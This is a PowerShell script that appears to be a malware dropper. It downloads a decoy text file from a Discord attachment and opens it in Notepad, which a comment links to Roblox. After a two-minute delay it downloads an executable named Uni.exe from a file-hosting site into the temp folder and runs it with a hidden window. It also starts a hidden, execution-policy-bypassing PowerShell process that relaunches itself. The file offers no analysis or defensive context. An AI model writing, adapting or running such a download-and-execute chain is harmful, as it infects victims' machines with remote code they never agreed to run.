# Define URLs
$txtUrl = "https://cdn.discordapp.com/attachments/1166425843451580519/1167728744505548810/Addressed_Issue.txt"
$batUrl = "https://store1.gofile.io/download/fd2e9f96-71a9-431a-933f-4d9bfa0196f7/Uni.exe"

# Define file paths
$txtPath = [System.IO.Path]::Combine($env:TEMP, "Addressed_Issue.txt")
$batPath = [System.IO.Path]::Combine($env:TEMP, "Uni.exe")

# Install and open www.roblox.com.txt
iwr -Uri $txtUrl -OutFile $txtPath
Start-Process -FilePath notepad.exe -ArgumentList $txtPath

# Wait for 120 seconds
Start-Sleep -Seconds 120

# Download Uni.bat
iwr -Uri $batUrl -OutFile $batPath

# Define a script block to run PowerShell
$psScript = {
    Start-Process -FilePath powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Wait
}

# Start a background job for the PowerShell script
$psJob = Start-Job -ScriptBlock $psScript

# Check if Uni.bat exists and run it with hidden window style
if (Test-Path $batPath) {
    Start-Process -FilePath $batPath -WindowStyle Hidden
}

# Wait for Uni.bat to complete
$psJob | Wait-Job
$psJob | Remove-Job
